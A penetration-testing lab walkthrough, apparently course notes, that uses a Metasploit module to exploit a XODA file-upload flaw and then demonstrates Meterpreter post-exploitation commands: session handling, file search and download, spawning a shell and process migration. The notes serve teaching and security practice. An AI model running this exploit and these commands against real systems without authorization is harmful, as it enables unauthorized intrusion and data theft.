# Meterpreter Fundamentals

## Post Exploitation

- **Post exploitation** refers to the actions performed on the target system **after initial access** has been obtained.
- The post exploitation phase of a penetration test includes various techniques such as:
  - **Local Enumeration**: Gathering information about the local system and environment.
  - **Privilege Escalation**: Gaining higher-level access on the target system.
  - **Dumping Hashes**: Extracting password hashes from the system.
  - **Establishing Persistence**: Ensuring continued access to the system.
  - **Clearing Tracks**: Removing evidence of compromise.
  - **Pivoting**: Using the compromised system as a pivot point to target other systems in the network.

## Meterpreter

- **Meterpreter (Meta-Interpreter)** is an advanced, multi-functional payload that operates via **DLL injection**, executed in memory, making it harder to detect.
- It communicates over a stager socket and provides an attacker with an **interactive command interpreter** to:
  - Execute system commands.
  - Navigate the file system.
  - Capture keylogs.
  - Load custom scripts and plugins dynamically.
- Metasploit offers various types of Meterpreter payloads depending on the **target environment** and **OS architecture**.

## Demo: Meterpreter Fundamentals

### Plan

We will first exploit a vulnerable web application, gain access to the system using Meterpreter, and perform basic post-exploitation tasks such as interacting with the session, navigating the file system, and using key Meterpreter commands.

### Step-by-Step Process

Check network interface configuration:

```bash
ifconfig
```

Start the PostgreSQL service and launch Metasploit:

```bash
service postgresql start && msfconsole
```

Create a new workspace for the Meterpreter session:

```bash
workspace -a Meterpreter
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
setg rhost [targetIP]
```

Perform an Nmap scan to identify open ports and services:

```bash
db_nmap -sV [targetIP]
```

We find that there is a **web server** running on **port 80**, with no SSL certificate:

```bash
services
```

Download the homepage of the web server:

```bash
curl [targetIP]
```

Search for a known **XODA** exploit:

```bash
search xoda
```

Use the **XODA file upload exploit**:

```bash
use exploit/unix/webapp/xoda_file_upload
```

Show the available options:

```bash
show options
```

Set the **TARGETURI** to `/` because XODA is running on the root of the web server:

```bash
set TARGETURI /
```

Run the exploit to gain access:

```bash
run
```

### Interacting with Meterpreter Session

Once we have access, we can gather system information:

```bash
sysinfo
```

Check the current user ID:

```bash
getuid
```

Display the Meterpreter help menu:

```bash
help
```

### Managing Sessions

Background the current session:

```bash
background
```

List all active sessions:

```bash
sessions
```

Show help for the sessions command:

```bash
sessions -h
```

Run a command on the target without interacting with the session:

```bash
sessions -C sysinfo -i 1
```

Terminate a session:

```bash
sessions -k 1
```

List active sessions:

```bash
sessions -l
```

Name a session and interact with it:

```bash
sessions -n [name] -i 1
```

### File System Navigation Commands

- List files in the current directory:

    ```bash
    ls
    ```

- Check the current directory:

    ```bash
    pwd
    ```

- Move up one directory level:

    ```bash
    cd ..
    ```

- Read a file:

    ```bash
    cat flag.txt
    ```

- Edit a file:

    ```bash
    edit flag.txt
    ```

- Navigate to a file or directory with spaces in the name:

    ```bash
    cd "Secret Flag.txt"
    ```

- Download a file:

    ```bash
    download flag5.zip
    ```

### Working with Files

- Unzip a downloaded file:

    ```bash
    unzip flag5.zip
    ```

- Get the MD5 checksum of a binary:

    ```bash
    checksum md5 /bin/bash
    ```

- Check environment variables:

    ```bash
    getenv PATH
    getenv TERM
    ```

### Searching for Files

- Search for a specific file by name in a directory:

    ```bash
    search -d /usr/bin -f *backdoor*
    ```

- Search for image files:

    ```bash
    search -f *.jpg
    ```

- Search for PHP files:

    ```bash
    search -f *.php
    ```

### Downloading Files

Download a file from the target system:

```bash
download flag1
```

### Opening a Shell on the Target System

Open a shell on the target system:

```bash
shell
```

- List files in the shell:

    ```bash
    ls
    ```

- Open an interactive bash shell:

    ```bash
    /bin/bash -i
    ```

Exit the shell using **CTRL + C**.

### Managing Processes

List the running processes on the target system:

```bash
ps
```

Migrate to a specific process by its process ID:

```bash
migrate 500
```

Migrate to a process by name (e.g., apache2):

```bash
migrate -N apache2
```

Execute a command:

```bash
execute -f ifconfig
```

Create and remove directories:

- Create a directory:

    ```bash
    mkdir test
    ```

- Remove a directory:

    ```bash
    rmdir test
    ```

### Conclusion

What we accomplished:
- Used Meterpreter to interact with the compromised system.
- Navigated the file system and executed key commands.
- Managed sessions and interacted with the target system using both Meterpreter and shell commands.
- Demonstrated how to search, download, and manipulate files on the target system.
